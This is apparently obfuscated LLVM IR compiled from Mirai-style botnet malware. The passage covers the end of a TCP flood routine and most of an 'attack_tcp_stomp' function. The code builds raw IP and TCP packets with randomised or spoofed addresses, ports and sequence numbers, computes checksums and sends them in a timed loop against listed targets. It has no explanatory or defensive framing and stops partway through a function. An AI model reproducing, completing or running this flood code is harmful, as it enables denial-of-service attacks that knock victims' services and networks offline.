  store %struct.tcphdr* %502, %struct.tcphdr** %37, align 8
  %503 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %504 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %503, i64 1
  %505 = bitcast %struct.tcphdr* %504 to i8*
  store i8* %505, i8** %38, align 8
  %506 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %507 = load i32, i32* %11, align 4
  %508 = sext i32 %507 to i64
  %509 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %506, i64 %508
  %510 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %509, i32 0, i32 2
  %511 = load i8, i8* %510, align 4
  %512 = zext i8 %511 to i32
  %513 = icmp slt i32 %512, 32
  br i1 %513, label %514, label %539

; <label>:514:                                    ; preds = %492
  %515 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %516 = load i32, i32* %11, align 4
  %517 = sext i32 %516 to i64
  %518 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %515, i64 %517
  %519 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %518, i32 0, i32 1
  %520 = load i32, i32* %519, align 4
  %521 = call i32 @ntohl(i32 %520) #7
  %522 = call i32 @rand_next()
  %523 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %524 = load i32, i32* %11, align 4
  %525 = sext i32 %524 to i64
  %526 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %523, i64 %525
  %527 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %526, i32 0, i32 2
  %528 = load i8, i8* %527, align 4
  %529 = zext i8 %528 to i32
  %530 = lshr i32 %522, %529
  %531 = sub i32 0, %521
  %532 = sub i32 0, %530
  %533 = add i32 %531, %532
  %534 = sub i32 0, %533
  %535 = add i32 %521, %530
  %536 = call i32 @htonl(i32 %534) #7
  %537 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %538 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %537, i32 0, i32 9
  store i32 %536, i32* %538, align 4
  br label %539

; <label>:539:                                    ; preds = %514, %492
  %540 = load i32, i32* %30, align 4
  %541 = icmp eq i32 %540, -1
  br i1 %541, label %542, label %546

; <label>:542:                                    ; preds = %539
  %543 = call i32 @rand_next()
  %544 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %545 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %544, i32 0, i32 8
  store i32 %543, i32* %545, align 4
  br label %546

; <label>:546:                                    ; preds = %542, %539
  %547 = load i16, i16* %15, align 2
  %548 = zext i16 %547 to i32
  %549 = icmp eq i32 %548, 65535
  br i1 %549, label %550, label %563

; <label>:550:                                    ; preds = %546
  %551 = call i32 @rand_next()
  %552 = xor i32 %551, -1
  %553 = xor i32 65535, -1
  %554 = xor i32 1521925888, -1
  %555 = or i32 %552, %553
  %556 = or i32 1521925888, %554
  %557 = xor i32 %555, -1
  %558 = and i32 %557, %556
  %559 = and i32 %551, 65535
  %560 = trunc i32 %558 to i16
  %561 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %562 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %561, i32 0, i32 3
  store i16 %560, i16* %562, align 4
  br label %563

; <label>:563:                                    ; preds = %550, %546
  %564 = load i16, i16* %18, align 2
  %565 = zext i16 %564 to i32
  %566 = icmp eq i32 %565, 65535
  br i1 %566, label %567, label %580

; <label>:567:                                    ; preds = %563
  %568 = call i32 @rand_next()
  %569 = xor i32 %568, -1
  %570 = xor i32 65535, -1
  %571 = xor i32 -1212472514, -1
  %572 = or i32 %569, %570
  %573 = or i32 -1212472514, %571
  %574 = xor i32 %572, -1
  %575 = and i32 %574, %573
  %576 = and i32 %568, 65535
  %577 = trunc i32 %575 to i16
  %578 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %579 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %578, i32 0, i32 0
  store i16 %577, i16* %579, align 4
  br label %580

; <label>:580:                                    ; preds = %567, %563
  %581 = load i16, i16* %19, align 2
  %582 = zext i16 %581 to i32
  %583 = icmp eq i32 %582, 65535
  br i1 %583, label %584, label %593

; <label>:584:                                    ; preds = %580
  %585 = call i32 @rand_next()
  %586 = xor i32 65535, -1
  %587 = xor i32 %585, %586
  %588 = and i32 %587, %585
  %589 = and i32 %585, 65535
  %590 = trunc i32 %588 to i16
  %591 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %592 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %591, i32 0, i32 1
  store i16 %590, i16* %592, align 2
  br label %593

; <label>:593:                                    ; preds = %584, %580
  %594 = load i32, i32* %20, align 4
  %595 = icmp eq i32 %594, 65535
  br i1 %595, label %596, label %600

; <label>:596:                                    ; preds = %593
  %597 = call i32 @rand_next()
  %598 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %599 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %598, i32 0, i32 2
  store i32 %597, i32* %599, align 4
  br label %600

; <label>:600:                                    ; preds = %596, %593
  %601 = load i32, i32* %21, align 4
  %602 = icmp eq i32 %601, 65535
  br i1 %602, label %603, label %607

; <label>:603:                                    ; preds = %600
  %604 = call i32 @rand_next()
  %605 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %606 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %605, i32 0, i32 3
  store i32 %604, i32* %606, align 4
  br label %607

; <label>:607:                                    ; preds = %603, %600
  %608 = load i8, i8* %29, align 1
  %609 = icmp ne i8 %608, 0
  br i1 %609, label %610, label %617

; <label>:610:                                    ; preds = %607
  %611 = load i8*, i8** %38, align 8
  %612 = load i32, i32* %28, align 4
  call void @rand_alphastr(i8* %611, i32 %612)
  %613 = load i8*, i8** %38, align 8
  %614 = load i32, i32* %28, align 4
  %615 = sext i32 %614 to i64
  %616 = getelementptr inbounds i8, i8* %613, i64 %615
  store i8 0, i8* %616, align 1
  br label %617

; <label>:617:                                    ; preds = %610, %607
  %618 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %619 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %618, i32 0, i32 7
  store i16 0, i16* %619, align 2
  %620 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %621 = bitcast %struct.iphdr* %620 to i16*
  %622 = call zeroext i16 @checksum_generic(i16* %621, i32 20)
  %623 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %624 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %623, i32 0, i32 7
  store i16 %622, i16* %624, align 2
  %625 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %626 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %625, i32 0, i32 6
  store i16 0, i16* %626, align 4
  %627 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %628 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %629 = bitcast %struct.tcphdr* %628 to i8*
  %630 = load i32, i32* %28, align 4
  %631 = sext i32 %630 to i64
  %632 = sub i64 0, %631
  %633 = sub i64 20, %632
  %634 = add i64 20, %631
  %635 = trunc i64 %633 to i16
  %636 = call zeroext i16 @htons(i16 zeroext %635) #7
  %637 = load i32, i32* %28, align 4
  %638 = sext i32 %637 to i64
  %639 = add i64 20, 8787105602064605620
  %640 = add i64 %639, %638
  %641 = sub i64 %640, 8787105602064605620
  %642 = add i64 20, %638
  %643 = trunc i64 %641 to i32
  %644 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %627, i8* %629, i16 zeroext %636, i32 %643)
  %645 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %646 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %645, i32 0, i32 6
  store i16 %644, i16* %646, align 4
  %647 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %648 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %647, i32 0, i32 1
  %649 = load i16, i16* %648, align 2
  %650 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %651 = load i32, i32* %11, align 4
  %652 = sext i32 %651 to i64
  %653 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %650, i64 %652
  %654 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %653, i32 0, i32 0
  %655 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %654, i32 0, i32 1
  store i16 %649, i16* %655, align 2
  %656 = load i32, i32* %12, align 4
  %657 = load i8*, i8** %35, align 8
  %658 = load i32, i32* %28, align 4
  %659 = sext i32 %658 to i64
  %660 = sub i64 0, %659
  %661 = sub i64 40, %660
  %662 = add i64 40, %659
  %663 = bitcast %union.__CONST_SOCKADDR_ARG* %39 to %struct.sockaddr**
  %664 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %665 = load i32, i32* %11, align 4
  %666 = sext i32 %665 to i64
  %667 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %664, i64 %666
  %668 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %667, i32 0, i32 0
  %669 = bitcast %struct.sockaddr_in* %668 to %struct.sockaddr*
  store %struct.sockaddr* %669, %struct.sockaddr** %663, align 8
  %670 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %39, i32 0, i32 0
  %671 = load %struct.sockaddr*, %struct.sockaddr** %670, align 8
  %672 = call i64 @sendto(i32 %656, i8* %657, i64 %661, i32 16384, %struct.sockaddr* %671, i32 16)
  br label %673

; <label>:673:                                    ; preds = %617
  %674 = load i32, i32* %11, align 4
  %675 = add i32 %674, -1814304978
  %676 = add i32 %675, 1
  %677 = sub i32 %676, -1814304978
  %678 = add nsw i32 %674, 1
  store i32 %677, i32* %11, align 4
  br label %487

; <label>:679:                                    ; preds = %487
  %680 = call i64 @time(i64* null) #6
  %681 = load i32, i32* %31, align 4
  %682 = sext i32 %681 to i64
  %683 = icmp sgt i64 %680, %682
  br i1 %683, label %684, label %685

; <label>:684:                                    ; preds = %679
  br label %686

; <label>:685:                                    ; preds = %679
  br label %486

; <label>:686:                                    ; preds = %684, %124, %118
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_stomp(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.attack_stomp_data*, align 8
  %14 = alloca i8**, align 8
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i8, align 1
  %18 = alloca i8, align 1
  %19 = alloca i16, align 2
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca %struct.sockaddr_in, align 4
  %31 = alloca %struct.sockaddr_in, align 4
  %32 = alloca i32, align 4
  %33 = alloca [256 x i8], align 16
  %34 = alloca i64, align 8
  %35 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %36 = alloca i32, align 4
  %37 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %38 = alloca %struct.tcphdr*, align 8
  %39 = alloca %struct.iphdr*, align 8
  %40 = alloca %struct.tcphdr*, align 8
  %41 = alloca i8*, align 8
  %42 = alloca i8*, align 8
  %43 = alloca %struct.iphdr*, align 8
  %44 = alloca %struct.tcphdr*, align 8
  %45 = alloca i8*, align 8
  %46 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %47 = load i8, i8* %7, align 1
  %48 = zext i8 %47 to i64
  %49 = call noalias i8* @calloc(i64 %48, i64 16) #6
  %50 = bitcast i8* %49 to %struct.attack_stomp_data*
  store %struct.attack_stomp_data* %50, %struct.attack_stomp_data** %13, align 8
  %51 = load i8, i8* %7, align 1
  %52 = zext i8 %51 to i64
  %53 = call noalias i8* @calloc(i64 %52, i64 8) #6
  %54 = bitcast i8* %53 to i8**
  store i8** %54, i8*** %14, align 8
  %55 = load i8, i8* %9, align 1
  %56 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %57 = call i32 @attack_get_opt_int(i8 zeroext %55, %struct.attack_option* %56, i8 zeroext 2, i32 0)
  %58 = trunc i32 %57 to i8
  store i8 %58, i8* %15, align 1
  %59 = load i8, i8* %9, align 1
  %60 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %61 = call i32 @attack_get_opt_int(i8 zeroext %59, %struct.attack_option* %60, i8 zeroext 3, i32 65535)
  %62 = trunc i32 %61 to i16
  store i16 %62, i16* %16, align 2
  %63 = load i8, i8* %9, align 1
  %64 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %65 = call i32 @attack_get_opt_int(i8 zeroext %63, %struct.attack_option* %64, i8 zeroext 4, i32 64)
  %66 = trunc i32 %65 to i8
  store i8 %66, i8* %17, align 1
  %67 = load i8, i8* %9, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %69 = call i32 @attack_get_opt_int(i8 zeroext %67, %struct.attack_option* %68, i8 zeroext 5, i32 1)
  %70 = trunc i32 %69 to i8
  store i8 %70, i8* %18, align 1
  %71 = load i8, i8* %9, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 7, i32 65535)
  %74 = trunc i32 %73 to i16
  store i16 %74, i16* %19, align 2
  %75 = load i8, i8* %9, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 10, i32 0)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %20, align 1
  %79 = load i8, i8* %9, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 11, i32 1)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %21, align 1
  %83 = load i8, i8* %9, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %85 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 12, i32 1)
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* %22, align 1
  %87 = load i8, i8* %9, align 1
  %88 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %89 = call i32 @attack_get_opt_int(i8 zeroext %87, %struct.attack_option* %88, i8 zeroext 13, i32 0)
  %90 = trunc i32 %89 to i8
  store i8 %90, i8* %23, align 1
  %91 = load i8, i8* %9, align 1
  %92 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %93 = call i32 @attack_get_opt_int(i8 zeroext %91, %struct.attack_option* %92, i8 zeroext 14, i32 0)
  %94 = trunc i32 %93 to i8
  store i8 %94, i8* %24, align 1
  %95 = load i8, i8* %9, align 1
  %96 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %97 = call i32 @attack_get_opt_int(i8 zeroext %95, %struct.attack_option* %96, i8 zeroext 15, i32 0)
  %98 = trunc i32 %97 to i8
  store i8 %98, i8* %25, align 1
  %99 = load i8, i8* %9, align 1
  %100 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %101 = call i32 @attack_get_opt_int(i8 zeroext %99, %struct.attack_option* %100, i8 zeroext 0, i32 768)
  store i32 %101, i32* %26, align 4
  %102 = load i8, i8* %9, align 1
  %103 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %104 = call i32 @attack_get_opt_int(i8 zeroext %102, %struct.attack_option* %103, i8 zeroext 1, i32 1)
  %105 = trunc i32 %104 to i8
  store i8 %105, i8* %27, align 1
  %106 = call i64 @time(i64* null) #6
  %107 = load i32, i32* %6, align 4
  %108 = sext i32 %107 to i64
  %109 = add i64 %106, -8318591553141217990
  %110 = add i64 %109, %108
  %111 = sub i64 %110, -8318591553141217990
  %112 = add nsw i64 %106, %108
  %113 = trunc i64 %111 to i32
  store i32 %113, i32* %28, align 4
  %114 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %114, i32* %12, align 4
  %115 = icmp eq i32 %114, -1
  br i1 %115, label %116, label %117

; <label>:116:                                    ; preds = %5
  br label %879

; <label>:117:                                    ; preds = %5
  store i32 1, i32* %11, align 4
  %118 = load i32, i32* %12, align 4
  %119 = bitcast i32* %11 to i8*
  %120 = call i32 @setsockopt(i32 %118, i32 0, i32 3, i8* %119, i32 4) #6
  %121 = icmp eq i32 %120, -1
  br i1 %121, label %122, label %125

; <label>:122:                                    ; preds = %117
  %123 = load i32, i32* %12, align 4
  %124 = call i32 @close(i32 %123)
  br label %879

; <label>:125:                                    ; preds = %117
  store i32 0, i32* %11, align 4
  br label %126

; <label>:126:                                    ; preds = %728, %125
  %127 = load i32, i32* %11, align 4
  %128 = load i8, i8* %7, align 1
  %129 = zext i8 %128 to i32
  %130 = icmp slt i32 %127, %129
  br i1 %130, label %131, label %734

; <label>:131:                                    ; preds = %126
  store i32 0, i32* %29, align 4
  br label %132

; <label>:132:                                    ; preds = %723, %710, %131
  %133 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %133, i32* %29, align 4
  %134 = icmp eq i32 %133, -1
  br i1 %134, label %135, label %136

; <label>:135:                                    ; preds = %132
  br label %728

; <label>:136:                                    ; preds = %132
  %137 = load i32, i32* %29, align 4
  %138 = load i32, i32* %29, align 4
  %139 = call i32 (i32, i32, ...) @fcntl(i32 %138, i32 3, i32 0)
  %140 = and i32 %139, 2048
  %141 = xor i32 %139, 2048
  %142 = or i32 %140, %141
  %143 = or i32 %139, 2048
  %144 = call i32 (i32, i32, ...) @fcntl(i32 %137, i32 4, i32 %142)
  %145 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 0
  store i16 2, i16* %145, align 4
  %146 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %147 = load i32, i32* %11, align 4
  %148 = sext i32 %147 to i64
  %149 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %146, i64 %148
  %150 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %149, i32 0, i32 2
  %151 = load i8, i8* %150, align 4
  %152 = zext i8 %151 to i32
  %153 = icmp slt i32 %152, 32
  br i1 %153, label %154, label %179

; <label>:154:                                    ; preds = %136
  %155 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %156 = load i32, i32* %11, align 4
  %157 = sext i32 %156 to i64
  %158 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %155, i64 %157
  %159 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %158, i32 0, i32 1
  %160 = load i32, i32* %159, align 4
  %161 = call i32 @ntohl(i32 %160) #7
  %162 = call i32 @rand_next()
  %163 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %164 = load i32, i32* %11, align 4
  %165 = sext i32 %164 to i64
  %166 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %163, i64 %165
  %167 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %166, i32 0, i32 2
  %168 = load i8, i8* %167, align 4
  %169 = zext i8 %168 to i32
  %170 = lshr i32 %162, %169
  %171 = sub i32 0, %161
  %172 = sub i32 0, %170
  %173 = add i32 %171, %172
  %174 = sub i32 0, %173
  %175 = add i32 %161, %170
  %176 = call i32 @htonl(i32 %174) #7
  %177 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 2
  %178 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %177, i32 0, i32 0
  store i32 %176, i32* %178, align 4
  br label %188

; <label>:179:                                    ; preds = %136
  %180 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %181 = load i32, i32* %11, align 4
  %182 = sext i32 %181 to i64
  %183 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %180, i64 %182
  %184 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %183, i32 0, i32 1
  %185 = load i32, i32* %184, align 4
  %186 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 2
  %187 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %186, i32 0, i32 0
  store i32 %185, i32* %187, align 4
  br label %188

; <label>:188:                                    ; preds = %179, %154
  %189 = load i16, i16* %19, align 2
  %190 = zext i16 %189 to i32
  %191 = icmp eq i32 %190, 65535
  br i1 %191, label %192, label %200

; <label>:192:                                    ; preds = %188
  %193 = call i32 @rand_next()
  %194 = xor i32 65535, -1
  %195 = xor i32 %193, %194
  %196 = and i32 %195, %193
  %197 = and i32 %193, 65535
  %198 = trunc i32 %196 to i16
  %199 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 1
  store i16 %198, i16* %199, align 2
  br label %204

; <label>:200:                                    ; preds = %188
  %201 = load i16, i16* %19, align 2
  %202 = call zeroext i16 @htons(i16 zeroext %201) #7
  %203 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 1
  store i16 %202, i16* %203, align 2
  br label %204

; <label>:204:                                    ; preds = %200, %192
  %205 = load i32, i32* %29, align 4
  %206 = bitcast %union.__CONST_SOCKADDR_ARG* %35 to %struct.sockaddr**
  %207 = bitcast %struct.sockaddr_in* %30 to %struct.sockaddr*
  store %struct.sockaddr* %207, %struct.sockaddr** %206, align 8
  %208 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %35, i32 0, i32 0
  %209 = load %struct.sockaddr*, %struct.sockaddr** %208, align 8
  %210 = call i32 @connect(i32 %205, %struct.sockaddr* %209, i32 16)
  %211 = call i64 @time(i64* null) #6
  store i64 %211, i64* %34, align 8
  br label %212

; <label>:212:                                    ; preds = %726, %204
  store i32 0, i32* %36, align 4
  store i32 16, i32* %32, align 4
  %213 = load i32, i32* %12, align 4
  %214 = getelementptr inbounds [256 x i8], [256 x i8]* %33, i32 0, i32 0
  %215 = bitcast %union.__CONST_SOCKADDR_ARG* %37 to %struct.sockaddr**
  %216 = bitcast %struct.sockaddr_in* %31 to %struct.sockaddr*
  store %struct.sockaddr* %216, %struct.sockaddr** %215, align 8
  %217 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %37, i32 0, i32 0
  %218 = load %struct.sockaddr*, %struct.sockaddr** %217, align 8
  %219 = call i64 @recvfrom(i32 %213, i8* %214, i64 256, i32 16384, %struct.sockaddr* %218, i32* %32)
  %220 = trunc i64 %219 to i32
  store i32 %220, i32* %36, align 4
  %221 = load i32, i32* %36, align 4
  %222 = icmp eq i32 %221, -1
  br i1 %222, label %223, label %224

; <label>:223:                                    ; preds = %212
  br label %879

; <label>:224:                                    ; preds = %212
  %225 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %31, i32 0, i32 2
  %226 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %225, i32 0, i32 0
  %227 = load i32, i32* %226, align 4
  %228 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 2
  %229 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %228, i32 0, i32 0
  %230 = load i32, i32* %229, align 4
  %231 = icmp eq i32 %227, %230
  br i1 %231, label %232, label %716

; <label>:232:                                    ; preds = %224
  %233 = load i32, i32* %36, align 4
  %234 = sext i32 %233 to i64
  %235 = icmp ugt i64 %234, 40
  br i1 %235, label %236, label %716

; <label>:236:                                    ; preds = %232
  %237 = getelementptr inbounds [256 x i8], [256 x i8]* %33, i32 0, i32 0
  %238 = getelementptr inbounds i8, i8* %237, i64 20
  %239 = bitcast i8* %238 to %struct.tcphdr*
  store %struct.tcphdr* %239, %struct.tcphdr** %38, align 8
  %240 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %241 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %240, i32 0, i32 0
  %242 = load i16, i16* %241, align 4
  %243 = zext i16 %242 to i32
  %244 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 1
  %245 = load i16, i16* %244, align 2
  %246 = zext i16 %245 to i32
  %247 = icmp eq i32 %243, %246
  br i1 %247, label %248, label %715

; <label>:248:                                    ; preds = %236
  %249 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %250 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %249, i32 0, i32 4
  %251 = load i16, i16* %250, align 4
  %252 = lshr i16 %251, 9
  %253 = xor i16 %252, -1
  %254 = xor i16 1, -1
  %255 = xor i16 7944, -1
  %256 = or i16 %253, %254
  %257 = or i16 7944, %255
  %258 = xor i16 %256, -1
  %259 = and i16 %258, %257
  %260 = and i16 %252, 1
  %261 = zext i16 %259 to i32
  %262 = icmp ne i32 %261, 0
  br i1 %262, label %263, label %680

; <label>:263:                                    ; preds = %248
  %264 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %265 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %264, i32 0, i32 4
  %266 = load i16, i16* %265, align 4
  %267 = lshr i16 %266, 12
  %268 = xor i16 1, -1
  %269 = xor i16 %267, %268
  %270 = and i16 %269, %267
  %271 = and i16 %267, 1
  %272 = zext i16 %270 to i32
  %273 = icmp ne i32 %272, 0
  br i1 %273, label %274, label %680

; <label>:274:                                    ; preds = %263
  %275 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 2
  %276 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %275, i32 0, i32 0
  %277 = load i32, i32* %276, align 4
  %278 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %279 = load i32, i32* %11, align 4
  %280 = sext i32 %279 to i64
  %281 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %278, i64 %280
  %282 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %281, i32 0, i32 0
  store i32 %277, i32* %282, align 4
  %283 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %284 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %283, i32 0, i32 2
  %285 = load i32, i32* %284, align 4
  %286 = call i32 @ntohl(i32 %285) #7
  %287 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %288 = load i32, i32* %11, align 4
  %289 = sext i32 %288 to i64
  %290 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %287, i64 %289
  %291 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %290, i32 0, i32 1
  store i32 %286, i32* %291, align 4
  %292 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %293 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %292, i32 0, i32 3
  %294 = load i32, i32* %293, align 4
  %295 = call i32 @ntohl(i32 %294) #7
  %296 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %297 = load i32, i32* %11, align 4
  %298 = sext i32 %297 to i64
  %299 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %296, i64 %298
  %300 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %299, i32 0, i32 2
  store i32 %295, i32* %300, align 4
  %301 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %302 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %301, i32 0, i32 1
  %303 = load i16, i16* %302, align 2
  %304 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %305 = load i32, i32* %11, align 4
  %306 = sext i32 %305 to i64
  %307 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %304, i64 %306
  %308 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %307, i32 0, i32 3
  store i16 %303, i16* %308, align 4
  %309 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %30, i32 0, i32 1
  %310 = load i16, i16* %309, align 2
  %311 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %312 = load i32, i32* %11, align 4
  %313 = sext i32 %312 to i64
  %314 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %311, i64 %313
  %315 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %314, i32 0, i32 4
  store i16 %310, i16* %315, align 2
  %316 = load i32, i32* %26, align 4
  %317 = sext i32 %316 to i64
  %318 = add i64 40, -7137352502233839419
  %319 = add i64 %318, %317
  %320 = sub i64 %319, -7137352502233839419
  %321 = add i64 40, %317
  %322 = call noalias i8* @malloc(i64 %320) #6
  %323 = load i8**, i8*** %14, align 8
  %324 = load i32, i32* %11, align 4
  %325 = sext i32 %324 to i64
  %326 = getelementptr inbounds i8*, i8** %323, i64 %325
  store i8* %322, i8** %326, align 8
  %327 = load i8**, i8*** %14, align 8
  %328 = load i32, i32* %11, align 4
  %329 = sext i32 %328 to i64
  %330 = getelementptr inbounds i8*, i8** %327, i64 %329
  %331 = load i8*, i8** %330, align 8
  %332 = bitcast i8* %331 to %struct.iphdr*
  store %struct.iphdr* %332, %struct.iphdr** %39, align 8
